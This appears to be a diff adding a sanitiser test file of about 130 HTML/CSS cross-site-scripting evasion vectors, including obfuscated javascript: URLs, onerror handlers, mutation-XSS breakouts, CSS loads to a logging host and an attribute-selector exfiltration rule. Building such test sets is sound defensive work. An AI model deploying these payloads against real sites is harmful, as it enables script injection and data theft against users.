@@ -1,0 +1,422 @@
+# Review vectors: a second set written by someone who did not write the sanitiser. Same format as xss.txt ("# name", records separated by "====").
+# {HOST} is the request-logging server; script vectors call alert(1), which the test page counts. Categories only from public evasion lists;
+# no text is copied from them.
+# rv-url-nbsp-scheme
+<a href="&nbsp;javascript:alert(1)">x</a><img src="&nbsp;javascript:alert(1)">
+====
+# rv-url-scheme-uppercase-entity-tab
+<a href="JaVa&Tab;Script&colon;alert(1)">x</a><a href="java&#10;script:alert(1)">y</a><a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">z</a>
+====
+# rv-url-nul-in-scheme
+<a href="java&#0;script:alert(1)">x</a><a href="java&#x1;script:alert(1)">y</a><a href="jav&#x7f;ascript:alert(1)">z</a>
+====
+# rv-url-data-html-base64
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a><img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+====
+# rv-url-data-image-with-params
+<img src="data:image/png;charset=utf-8;base64,AAAA"><img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"><img src="data:image/png;base64,AAAA&quot; onerror=&quot;alert(1)">
+====
+# rv-url-data-image-in-link
+<a href="data:image/png;base64,AAAA">x</a><a href="data:image/gif;base64,R0lGODlhAQABAAAAACw=">y</a>
+====
+# rv-url-data-image-percent
+<img src="data:image/png;base64,%3Cscript%3Ealert(1)%3C/script%3E"><img src="data:image/gif;base64,AAAA%0aAAAA">
+====
+# rv-url-blob-filesystem
+<a href="blob:http://{HOST}/abc">x</a><a href="filesystem:http://{HOST}/temporary/a">y</a><img src="blob:http://{HOST}/abc"><img src="filesystem:http://{HOST}/t/a">
+====
+# rv-url-other-schemes
+<a href="about:blank">a</a><a href="chrome://settings">b</a><a href="ms-msdt:/id PCWDiagnostic">c</a><a href="intent://x#Intent;end">d</a><a href="view-source:http://{HOST}/v">e</a><a href="ftp://{HOST}/f">f</a><a href="ws://{HOST}/w">g</a><a href="sms:123">h</a>
+====
+# rv-url-http-no-host
+<img src="http:{HOST}/nohost"><img src="https:/{HOST}/oneslash"><img src="http:\\{HOST}/backslash"><img src="http:///{HOST}/threeslash">
+====
+# rv-url-userinfo-backslash
+<img src="http://x@{HOST}/u"><img src="http://{HOST}\@evil.invalid/p"><img src="http://{HOST}%2f@evil.invalid/q"><img src="http://{HOST}#@evil.invalid/r">
+====
+# rv-url-ideographic-dot-and-fullwidth
+<img src="http://{HOST}。evil/p"><img src="ｈｔｔｐ://{HOST}/fullwidth"><img src="http://ＥＸＡＭＰＬＥ.com/x">
+====
+# rv-url-unicode-newline-separators
+<a href="java&#x2028;script:alert(1)">x</a><a href="java&#x85;script:alert(1)">y</a><a href="&#x180e;javascript:alert(1)">z</a><a href="&#xfeff;javascript:alert(1)">w</a>
+====
+# rv-url-double-encoded
+<a href="javascript%3Aalert(1)">x</a><a href="javascript&amp;colon;alert(1)">y</a><a href="&amp;#106;avascript:alert(1)">z</a>
+====
+# rv-srcset-mixed
+<img src="x" srcset="javascript:alert(1) 1x, http://{HOST}/s2 2x, data:text/html;base64,AAAA 3x, //{HOST}/s4 4x">
+====
+# rv-srcset-comma-inside-url
+<img srcset="http://{HOST}/a,http://{HOST}/b 1x, http://{HOST}/c 2x">
+====
+# rv-srcset-descriptor-injection
+<img srcset="http://{HOST}/d 1x onerror=alert(1)"><img srcset="http://{HOST}/e 2x, javascript:alert(1)">
+====
+# rv-srcset-picture-sizes
+<picture><source srcset="http://{HOST}/p1 1x" media="(min-width:1px)"><source srcset="//{HOST}/p2" type="image/webp"><img src="x"></picture>
+====
+# rv-srcset-source-outside-picture
+<source srcset="http://{HOST}/lone"><video><source src="http://{HOST}/v"></video><audio><source src="http://{HOST}/au"></audio>
+====
+# rv-imagesrcset-link
+<link rel="preload" as="image" imagesrcset="http://{HOST}/i1 1x" href="http://{HOST}/i0"><link rel="icon" href="http://{HOST}/ico">
+====
+# rv-ping-formaction-xlink
+<a href="http://{HOST}/a" ping="http://{HOST}/ping">x</a><button formaction="javascript:alert(1)">b</button><svg><a xlink:href="javascript:alert(1)"><text>t</text></a></svg>
+====
+# rv-base-and-relative
+<base href="http://{HOST}/base/"><img src="rel.png"><a href="rel">x</a><link rel="stylesheet" href="s.css">
+====
+# rv-meta-refresh-variants
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)"><meta http-equiv="Refresh" content="0; URL=http://{HOST}/refresh2"><meta http-equiv="set-cookie" content="a=b">
+====
+# rv-meta-refresh-in-body
+<body><meta http-equiv=refresh content="0;url=http://{HOST}/mr"><noscript><meta http-equiv=refresh content="0;url=http://{HOST}/nmr"></noscript></body>
+====
+# rv-attr-name-obfuscation
+<img src=x onerror=alert(1)><img/src=x/onerror=alert(1)><img src=x ONERROR=alert(1)><img src="x"onerror=alert(1)><img src=x on&#101;rror=alert(1)><img src=x on
+error=alert(1)>
+====
+# rv-attr-nul-and-quote-tricks
+<img src=x onerror&#0;=alert(1)><img src=x onerror=alert(1)//><a href=x" onclick=alert(1)>a</a><a href='x' onclick=alert(1) x='>b</a>
+====
+# rv-attr-duplicate
+<a href="http://{HOST}/first" href="javascript:alert(1)">x</a><a href="javascript:alert(1)" href="http://{HOST}/second">y</a><img src="x" src="http://{HOST}/dupsrc" onerror="alert(1)" onerror="alert(2)">
+====
+# rv-attr-style-duplicate
+<p style="color:red" style="background:url(http://{HOST}/dupstyle)">x</p><p style="background:url(http://{HOST}/s1);background:url(http://{HOST}/s2)">y</p>
+====
+# rv-tag-nul-and-case
+<scr&#0;ipt>alert(1)</scr&#0;ipt><ScRiPt >alert(1)</ScRiPt ><script
+>alert(1)</script
+><script/x>alert(1)</script/x>
+====
+# rv-tag-namespaced-lookalike
+<x:script>alert(1)</x:script><svg:script>alert(1)</svg:script><script:foo>alert(1)</script:foo><a:img src=x onerror=alert(1)>
+====
+# rv-script-in-attr-and-text
+<p title="<script>alert(1)</script>">t</p><p title='"><script>alert(1)</script>'>t</p><p>&lt;script&gt;alert(1)&lt;/script&gt;</p>
+====
+# rv-xmp-title-breakout
+<xmp><p title="</xmp><img src=x onerror=alert(1)>"></xmp><title><p title="</title><img src=x onerror=alert(1)>"></title>
+====
+# rv-textarea-iframe-noembed-breakout
+<textarea><p title="</textarea><img src=x onerror=alert(1)>"></textarea><iframe><p title="</iframe><img src=x onerror=alert(1)>"></iframe><noembed><p title="</noembed><img src=x onerror=alert(1)>"></noembed>
+====
+# rv-noframes-noscript-breakout
+<noframes><p title="</noframes><img src=x onerror=alert(1)>"></noframes><noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
+====
+# rv-template-style
+<template><style></template><img src=x onerror=alert(1)></style></template><template><img src=x onerror=alert(1)></template>
+====
+# rv-select-template-style
+<select><template><style></select><img src=x onerror=alert(1)>
+====
+# rv-math-mtext-form
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+====
+# rv-math-mi-style-title
+<math><mi><style><img title="</style><img src=x onerror=alert(1)>"></style></mi></math>
+====
+# rv-svg-desc-cdata
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg><math><mi><svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg></mi></math>
+====
+# rv-svg-p-breakout
+<svg><p><img src=x onerror=alert(1)></p></svg><svg></p><img src=x onerror=alert(1)><svg><b><img src=x onerror=alert(1)>
+====
+# rv-svg-foreignobject-annotation
+<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg><math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math><math><annotation-xml encoding="application/xhtml+xml"><script>alert(1)</script></annotation-xml></math>
+====
+# rv-svg-mglyph-malignmark
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;"></table></mtext></math>
+====
+# rv-math-mi-img-breakout
+<math><mi><b></b></mi><img src=x onerror=alert(1)></math><math><mtext><img src=x onerror=alert(1)></mtext></math>
+====
+# rv-svg-nested-in-table
+<table><svg><tr><td><img src=x onerror=alert(1)></td></tr></svg></table><table><math><td><img src=x onerror=alert(1)></td></math></table>
+====
+# rv-comment-forms
+<!--><img src=x onerror=alert(1)>--><!---><img src=x onerror=alert(2)>--><!-- --!><img src=x onerror=alert(3)>--><!--[if x]><img src=x onerror=alert(4)><![endif]-->
+====
+# rv-comment-in-style
+<style><!--</style><img src=x onerror=alert(1)>--></style><style>/*</style><img src=x onerror=alert(2)>*/</style>
+====
+# rv-bogus-comments
+<![CDATA[ ><img src=x onerror=alert(1)>]]><?php ><img src=x onerror=alert(2)> ?><!x ><img src=x onerror=alert(3)></x><//x><img src=x onerror=alert(4)>
+====
+# rv-doctype-and-html-attrs
+<!DOCTYPE html [<!ENTITY x "<script>alert(1)</script>">]><html onload=alert(1) manifest="http://{HOST}/mf" xmlns="http://www.w3.org/1999/xhtml"><head profile="http://{HOST}/prof"></head><body>&x;</body></html>
+====
+# rv-body-attrs
+<body onload=alert(1) background="http://{HOST}/bodybg" bgcolor="red;position:fixed" text="url(http://{HOST}/t)" style="background:url(http://{HOST}/bodystyle)" class="x" id="y">hi</body>
+====
+# rv-body-color-injection
+<body bgcolor="rgb(" text="red)"><p>text</p></body><body bgcolor="url(http" text="x"><p>t</p></body>
+====
+# rv-nested-body-html
+<html><body onload=alert(1)><html onclick=alert(2)><body background="http://{HOST}/nb" onfocus=alert(3)>t
+====
+# rv-frameset-after-body
+<body>x</body><frameset onload=alert(1)><frame src="http://{HOST}/fr"></frameset>
+====
+# rv-isindex-keygen-portal
+<isindex action="javascript:alert(1)" type=image src="http://{HOST}/idx"><keygen autofocus onfocus=alert(1)><portal src="http://{HOST}/portal"></portal><fencedframe src="http://{HOST}/ff"></fencedframe>
+====
+# rv-dialog-popover-details
+<dialog open onclose=alert(1)><img src=x onerror=alert(2)></dialog><div popover id=pp onbeforetoggle=alert(3)>p</div><button popovertarget=pp>b</button><details open ontoggle=alert(4)>d</details>
+====
+# rv-formfields-unwrapped
+<form action="http://{HOST}/post" method=post><input name=a value=b><input type=image src="http://{HOST}/inimg"><button type=submit>go</button><select><option>o</select><label for=a>l</label></form>
+====
+# rv-form-attr-outside
+<form id=f action="http://{HOST}/f2"></form><button form=f type=submit formaction="http://{HOST}/f3" formtarget=_top>b</button><input form=f type=submit>
+====
+# rv-id-name-clobber
+<img id=x name=y><a id=defaultView name=cookie href="http://{HOST}/c">c</a><form id=forms name=forms></form><a id=om-x>a</a><div id="a b">b</div><div id="__proto__"></div>
+====
+# rv-class-style-hijack
+<style>.x{color:red}.omx-box{display:none}.omx{display:none}#omx-display{display:none}.omx-display .omx-header{display:none}</style><div class="omx-box omx omx-display omx-header">visible</div>
+====
+# rv-contenteditable-draggable-misc
+<div contenteditable=true tabindex=0 accesskey=x draggable=true spellcheck=true autofocus is=x slot=y part=z nonce=n hidden>t</div>
+====
+# rv-attr-allowed-oddities
+<font face="x;position:fixed" color="red;position:fixed" size="9999999999"><table width="1;x" height="expression(alert(1))" border="1 2" cellpadding="-1" bgcolor="#fff;x"><tr><td colspan="1000000" rowspan="x">c</td></tr></table></font>
+====
+# rv-ol-li-type-value
+<ol type="1;x" start="1e9"><li value="9999999999999">a<li type='"><script>alert(1)</script>'>b</ol><ul type=disc><li value="-0">c</ul>
+====
+# rv-lang-dir-title-alt
+<p lang='x" onclick="alert(1)' dir="rtl&quot; onclick=alert(1)" title="a&#10;b" align='left" onclick="alert(1)'>t</p><img alt='" onerror="alert(1)' src=x>
+====
+# rv-time-datetime-abbr
+<time datetime='x" onclick="alert(1)'>t</time><abbr title="` onclick=alert(1) `">a</abbr><del datetime="javascript:alert(1)">d</del>
+====
+# rv-control-chars-text
+<p>a&#x1b;$B&#x1b;(J" onclick=alert(1)&#x1b;(B b</p><p title="&#x1b;(J&quot; onclick=alert(1)">t</p><p>+ADw-script+AD4-alert(1)+ADw-/script+AD4-</p>
+====
+# rv-bom-and-nonchars
+<p>&#xfeff;&#xfffe;&#xffff;&#xd800;&#x10ffff;&#x0;a</p>
+====
+# rv-css-attr-functions
+<p style="background:image(http://{HOST}/i);background-image:cross-fade(url(http://{HOST}/c1),url(http://{HOST}/c2),50%);background:element(#x);background:paint(x);background:src(http://{HOST}/src)">t</p>
+====
+# rv-css-image-set-prefixed
+<p style="background-image:-webkit-image-set(url(http://{HOST}/w1) 1x);background-image:image-set('http://{HOST}/w2' 1x);background-image:-webkit-cross-fade(url(http://{HOST}/w3),url(http://{HOST}/w4),1)">t</p>
+====
+# rv-css-list-style-shorthand
+<ul style="list-style:url(http://{HOST}/ls) inside"><li>a</ul><ol style="list-style-image:url(//{HOST}/ls2)"><li>b</ol>
+====
+# rv-css-shorthand-urls
+<p style="border:url(http://{HOST}/b1);outline:url(http://{HOST}/b2) 1px;font:12px url(http://{HOST}/b3);background:red url(http://{HOST}/b4) no-repeat;text-shadow:url(http://{HOST}/b5);box-shadow:url(http://{HOST}/b6)">t</p>
+====
+# rv-css-gradient-urls
+<p style="background:linear-gradient(red,url(http://{HOST}/g1));background:radial-gradient(url(http://{HOST}/g2),blue);background:conic-gradient(from 0deg,url(http://{HOST}/g3))">t</p>
+====
+# rv-css-calc-nesting
+<p style="width:calc(calc(calc(calc(calc(calc(calc(calc(calc(1px + 1px)))))))))));height:min(max(clamp(1px,url(http://{HOST}/cn),2px),1px),3px)">t</p>
+====
+# rv-css-url-forms
+<p style="background:url( http://{HOST}/u1 );background:url('http://{HOST}/u2');background:URL(http://{HOST}/u3);background:u\72l(http://{HOST}/u4);background:url(http://{HOST}/u5 http://{HOST}/u5b);background:url(http://{HOST}/u6'x)">t</p>
+====
+# rv-css-url-javascript-and-data
+<p style="background:url(javascript:alert(1));background:url('JaVaScRiPt:alert(1)');background:url(data:text/html,<script>alert(1)</script>);background:url(data:image/svg+xml,<svg onload=alert(1)>);background:url(vbscript:msgbox(1))">t</p>
+====
+# rv-css-url-entity-in-attr
+<p style="background:url(&#x6a;avascript:alert(1));background:url(&quot;http://{HOST}/ent1&quot;);background:url(&#x68;ttp://{HOST}/ent2)">t</p>
+====
+# rv-css-escape-in-ident-and-string
+<p style="background:url('http://{HOST}/\68ex');color:\72ed;font-family:'\22 onclick=alert(1)//';background:u\000072l(http://{HOST}/zeros)">t</p>
+====
+# rv-css-close-style-in-values
+<p style="font-family:'</style><img src=x onerror=alert(1)>';quotes:'<' '>';font-family:\3c /style\3e">t</p><style>p{font-family:"</style><img src=x onerror=alert(2)>"}</style>
+====
+# rv-css-close-style-in-selector
+<style>.a\3C /style\3E <img src=x onerror=alert(1)>{color:red}[data-x="</style><img src=x onerror=alert(2)>"]{color:red}a[href$='</style>' i]{color:red}</style><a class="x">x</a>
+====
+# rv-css-close-style-in-name
+<style>p</style><img src=x onerror=alert(1)>{color:red}</style><div class="</style><img src=x onerror=alert(2)>">d</div>
+====
+# rv-css-comment-tricks
+<style>p{color:red/*;background:url(http://{HOST}/ct1)*/}p{background:ur/**/l(http://{HOST}/ct2)}p{back/**/ground:url(http://{HOST}/ct3)}/*</style><img src=x onerror=alert(1)>*/</style>
+====
+# rv-css-at-rules-nested
+<style>@media screen{@import url(http://{HOST}/ni1);p{background:url(http://{HOST}/ni2)}@media print{p{background:url(http://{HOST}/ni3)}}}@supports (display:block){p{background:url(http://{HOST}/ni4)}}@layer a{p{background:url(http://{HOST}/ni5)}}@container (min-width:1px){p{background:url(http://{HOST}/ni6)}}</style><p>t</p>
+====
+# rv-css-import-forms
+<style>@import "http://{HOST}/i1";@import url(http://{HOST}/i2);@IMPORT url('http://{HOST}/i3') screen;@\69mport "http://{HOST}/i4";p{color:red}@import "http://{HOST}/i5";</style><p>t</p>
+====
+# rv-css-font-face-forms
+<style>@font-face{font-family:x;src:url(http://{HOST}/ff1.woff)}@font-face{font-family:y;src:local(Arial),url(//{HOST}/ff2.woff) format("woff")}@font-face{font-family:z;src:url(data:font/woff;base64,AAAA)}@font-face{font-family:w;src:url(javascript:alert(1))}p{font-family:x}</style><p>t</p>
+====
+# rv-css-font-face-unicode-range-display
+<style>@font-face{font-family:q;src:url(http://{HOST}/ff3.woff);unicode-range:U+0-10FFFF;font-display:block}@font-face{font-family:Arial;src:url(http://{HOST}/ff4.woff)}</style><p style="font-family:Arial">t</p>
+====
+# rv-css-position-overlay
+<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999;background:red">overlay</div><div style="POSITION : FIXED">x</div><div style="po\73ition:fixed">y</div><div style="position:absolute;inset:0">z</div>
+====
+# rv-css-escape-wrapper-other-props
+<div style="margin:-100000px;width:100000px;height:100000px;float:left;transform:translate(-9999px);display:contents;overflow:visible;outline:100000px solid red;outline-offset:100000px;box-shadow:0 0 0 100000px red">t</div>
+====
+# rv-css-anchor-popover-top-layer
+<div style="anchor-name:--a;position-anchor:--a;top-layer:auto;container-type:size;contain:layout;will-change:transform;backdrop-filter:blur(1px);mix-blend-mode:difference;pointer-events:none;user-select:none;scroll-snap-type:x;view-transition-name:x">t</div>
+====
+# rv-css-custom-property-var
+<p style="--x:url(http://{HOST}/cp);background:var(--x);color:var(--y,red)">t</p><style>:root{--z:url(http://{HOST}/cp2)}p{background:var(--z)}</style>
+====
+# rv-css-selectors-escape-wrapper
+<style>html,body,:root,html body,html>body,body body,:root body{background:url(http://{HOST}/sw1);color:red}.omx-box,.omx,.omx-box *{color:blue}:is(.omx-box,body) p{color:green}:where(p){color:green}p:has(img[src]){background:url(http://{HOST}/sw2)}</style><p>t</p>
+====
+# rv-css-selectors-host-page
+<style>*{color:red}*|*{color:red}p::-webkit-scrollbar{width:1px}:host{color:red}::slotted(p){color:red}:root{color:red}body *{color:red}html body *{color:red}:not(.a) *{color:red}</style><p>t</p>
+====
+# rv-css-selector-nesting-and-comma
+<style>p{color:red;&:hover{background:url(http://{HOST}/nest)}}p{color:red;@media screen{background:url(http://{HOST}/nest2)}}p,{color:red}{color:red},p{color:red}</style><p>t</p>
+====
+# rv-css-attribute-selector-exfil
+<style>input[value^="a"]{background:url(http://{HOST}/exf1)}a[href^="http://"]{background:url(http://{HOST}/exf2)}img[src*="x"]{background:url(http://{HOST}/exf3)}[class="x"]{color:red}[id=y]{color:red}[style*=red]{color:blue}</style><a href="http://{HOST}/l">l</a><img src="x" class="x" id="y">
+====
+# rv-css-pseudo-elements-content
+<style>p::before{content:url(http://{HOST}/pe1);color:red}p::after{content:attr(href);background:url(http://{HOST}/pe2)}p::marker{content:"x"}p::first-letter{background:url(http://{HOST}/pe3)}p::selection{background:url(http://{HOST}/pe4)}p:hover::before{background:url(http://{HOST}/pe5)}</style><p>t</p>
+====
+# rv-css-keyframes-animation
+<style>@keyframes k{from{background:url(http://{HOST}/kf1)}to{background:url(http://{HOST}/kf2)}}p{animation:k 1s;animation-name:k;transition:all 1s}</style><p style="animation:k 1s">t</p>
+====
+# rv-css-expression-and-legacy
+<p style="width:expression(alert(1));zoom:expression(alert(2));behavior:url(http://{HOST}/htc);-moz-binding:url(http://{HOST}/xbl#x);-ms-behavior:url(x);filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='http://{HOST}/ail')">t</p>
+====
+# rv-css-colors-and-numbers
+<p style="color:rgb(1e999999,0,0);width:1e999999px;height:-0px;margin:99999999999999999999999999px;background:#12345678901234567890;color:red!important;color:red ! important">t</p>
+====
+# rv-css-string-newline-unterminated
+<p style="font-family:'abc
+def;background:url(http://{HOST}/sn1)">t</p><p style="font-family:'abc;background:url(http://{HOST}/sn2)">t</p>
+====
+# rv-css-unterminated-constructs
+<p style="background:url(http://{HOST}/un1">a</p><p style="color:rgb(1,2,3;background:url(http://{HOST}/un2)">b</p><style>p{background:url(http://{HOST}/un3)</style><p>c</p><style>@media screen{p{background:url(http://{HOST}/un4)</style><p>d</p>
+====
+# rv-css-cdo-cdc-and-html-comments
+<style><!-- p{background:url(http://{HOST}/cc1)} --> p{background:url(http://{HOST}/cc2)}</style><p>t</p>
+====
+# rv-style-element-attrs
+<style type="text/css" media="all">p{background:url(http://{HOST}/sa1)}</style><style media="print">p{background:url(http://{HOST}/sa2)}</style><style type="text/less">p{background:url(http://{HOST}/sa3)}</style><style media="screen and (min-width:0)" blocking=render>p{background:url(http://{HOST}/sa4)}</style><p>t</p>
+====
+# rv-style-element-in-odd-places
+<table><style>p{background:url(http://{HOST}/so1)}</style><tr><td><style>p{background:url(http://{HOST}/so2)}</style></td></tr></table><select><style>p{background:url(http://{HOST}/so3)}</style></select><a><style>p{background:url(http://{HOST}/so4)}</style></a><p>t</p>
+====
+# rv-style-element-in-foreign
+<svg><style>p{background:url(http://{HOST}/sf1)}</style></svg><math><style>p{background:url(http://{HOST}/sf2)}</style></math><svg><style><![CDATA[p{background:url(http://{HOST}/sf3)}]]></style></svg><p>t</p>
+====
+# rv-style-element-entities
+<style>p{font-family:&quot;a&quot;;background:url(&quot;http://{HOST}/se1&quot;)}</style><p>t</p>
+====
+# rv-style-text-split-by-comments-nodes
+<style>p{color:red}</style><style>p{background:url(http://{HOST}/sp1)}</style><style>}p{background:url(http://{HOST}/sp2)}{</style><p>t</p>
+====
+# rv-nested-anchors
+<a href="http://{HOST}/a1"><b><a href="javascript:alert(1)">x</a></b></a><a href="http://{HOST}/a2"><table><tr><td><a href="javascript:alert(2)">y</a></td></tr></table></a>
+====
+# rv-misnested-formatting
+<a href="javascript:alert(1)"><b><i></a></b></i><p><b><p><i><p></b></i><img src=x onerror=alert(2)>
+====
+# rv-table-foster
+<table><a href="javascript:alert(1)">x</a><b><img src=x onerror=alert(2)></b><tr><td>y</td></tr><script>alert(3)</script></table>
+====
+# rv-table-caption-colgroup
+<table><caption><img src=x onerror=alert(1)><col><colgroup><col span="1;x" style="background:url(http://{HOST}/col)"></colgroup></caption></table>
+====
+# rv-pre-listing-newlines
+<pre>
+
+<img src=x onerror=alert(1)></pre><pre><script>x</script>
+y</pre><pre><style>p{}</style>
+z</pre>
+====
+# rv-p-in-button-in-select
+<select><button><p><img src=x onerror=alert(1)></p></button></select><button><button><img src=x onerror=alert(2)></button></button>
+====
+# rv-image-alias-and-br
+<image src="http://{HOST}/imgalias" onerror=alert(1)></image></br><br/ onclick=alert(2)><wbr onclick=alert(3)>
+====
+# rv-deep-nesting-div
+<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><img src=x onerror=alert(1)></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div>
+====
+# rv-ruby-bdo-dir-override
+<bdo dir="rtl">abc</bdo><bdo dir="ltr" onclick=alert(1)>x</bdo><ruby>a<rt>b</rt><rp>(</rp></ruby><span style="unicode-bidi:bidi-override;direction:rtl">gpj.exe</span>
+====
+# rv-mailto-and-fragment
+<a href="mailto:a@b.c?subject=x&body=y">m</a><a href="mailto:javascript:alert(1)">m2</a><a href="tel:javascript:alert(1)">t</a><a href="#javascript:alert(1)">f</a><a href="#om-x">g</a><a href="#">h</a>
+====
+# rv-link-target-rel-forced
+<a href="http://{HOST}/t1" target="_top" rel="opener">a</a><a href="http://{HOST}/t2" target="_self" rel="noopener" download="x" referrerpolicy="unsafe-url">b</a><img src="x" referrerpolicy="unsafe-url" crossorigin="use-credentials" loading="eager" fetchpriority="high" decoding="sync">
+====
+# rv-img-width-height-tracking
+<img src="http://{HOST}/trk1" width="1" height="1"><img src="http://{HOST}/trk2" style="width:0;height:0"><img src="http://{HOST}/trk3" style="display:none"><img src="http://{HOST}/open.gif" width="100%">
+====
+# rv-entity-edge
+<p>&lt;img src=x onerror=alert(1)&gt;</p><p>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</p><p>&#60;script&#62;alert(1)&#60;/script&#62;</p><p>&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;</p>
+====
+# rv-entity-no-semicolon-in-attr
+<a href="http://{HOST}/?a=1&copy=2&lt=3&amp=4&notit=5">x</a><a href="http://{HOST}/?x=&quot;onmouseover=alert(1)">y</a>
+====
+# rv-long-attribute-values
+<p title="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" class="a b c d e f g h i j k l m n o p q r s t u v w x y z" id="long-id-without-spaces">t</p>
+====
+# rv-text-only-fallback-trigger
+<b><i><u><s><a href=x><b><i><u><s><a href=y><b><i><u><s><a href=z>text</b></i></u></s></a></b></i></u></s></a></b></i></u></s></a>
+====
+# rv-unicode-lookalike-tags
+<ſcript>alert(1)</ſcript><ıframe src=javascript:alert(1)></ıframe><img src=x onerror＝alert(1)><a href="javascript：alert(1)">x</a>
+====
+# rv-cr-lf-in-tags
+<img
+src=x
+onerror
+=
+alert(1)><a
+href
+=
+"javascript:alert(1)">x</a><script
+>alert(1)</script
+>
+====
+# rv-plaintext-and-listing-unclosed
+<plaintext><img src=x onerror=alert(1)><script>alert(2)</script>
+====
+# rv-object-embed-fallback
+<object data="http://{HOST}/o1"><img src="http://{HOST}/o2"><embed src="http://{HOST}/o3"></object><applet code=x archive="http://{HOST}/ap"><param name=x value=y></applet>
+====
+# rv-video-audio-fallback-content
+<video poster="http://{HOST}/vp"><source src="http://{HOST}/vs"><img src="http://{HOST}/vi"></video><audio controls autoplay onplay=alert(1) src="http://{HOST}/as"></audio>
+====
+# rv-canvas-map-area
+<canvas width=1>fallback <img src="http://{HOST}/cv"></canvas><map name=m><area href="javascript:alert(1)" shape=default></map><img usemap="#m" src="http://{HOST}/mapimg">
+====
+# rv-iframe-fallback-text-and-srcdoc
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe><iframe src="about:blank" onload="alert(2)"></iframe><iframe src="data:text/html,<script>alert(3)</script>"></iframe>
+====
+# rv-menu-marquee-blink
+<menu><li onclick=alert(1)>m</menu><marquee onstart=alert(2) onfinish=alert(3)>m</marquee><blink onclick=alert(4)>b</blink><center onclick=alert(5)>c</center>
+====
+# rv-xml-processing-and-namespaces
+<?xml version="1.0"?><?xml-stylesheet href="http://{HOST}/xsl" type="text/xsl"?><html xmlns:o="urn:schemas-microsoft-com:office:office"><o:p>text</o:p><v:image src="http://{HOST}/vml" xmlns:v="urn:schemas-microsoft-com:vml"></v:image></html>
+====
+# rv-vml-office-conditional
+<!--[if gte vml 1]><v:shape><v:imagedata src="http://{HOST}/vml1"></v:imagedata></v:shape><![endif]--><!--[if !mso]><!--><img src="http://{HOST}/notmso"><!--<![endif]-->
+====
+# rv-cid-and-relative
+<img src="cid:logo@x"><img src="cid:%2e%2e/%2e%2e/etc/passwd"><img src="../../etc/passwd"><img src="file:///etc/passwd"><img src="//{HOST}/../x"><a href="cid:logo@x">c</a>
+====
+# rv-srcdoc-in-div
+<div srcdoc="<script>alert(1)</script>" data-x="y" is="x-foo" xmlns="http://www.w3.org/2000/svg">d</div>
+====
+# rv-event-handler-on-allowed-elements
+<table onclick=alert(1) onmouseover=alert(2)><tr onclick=alert(3)><td onclick=alert(4) onfocus=alert(5)>c</td></tr></table><li onclick=alert(6)>l<span onpointerover=alert(7) onauxclick=alert(8)>s</span><details ontoggle=alert(9) open><summary onclick=alert(10)>s</summary></details>
+====
+# rv-hash-and-selector-injection
+<style>#a{color:red}#1x{color:red}#a b{color:red}.a.b#c{color:red}p#-{color:red}.\31 x{color:red}.-x{color:red}.--x{color:red}</style><p class="a b" id="a">t</p>
+====
+# rv-big-number-attrs
+<table width="99999999999999999999" height="-99999999999999999999" cellspacing="1.5.5" cellpadding="--1" border="+1%"><tr><td>x</td></tr></table>
+====
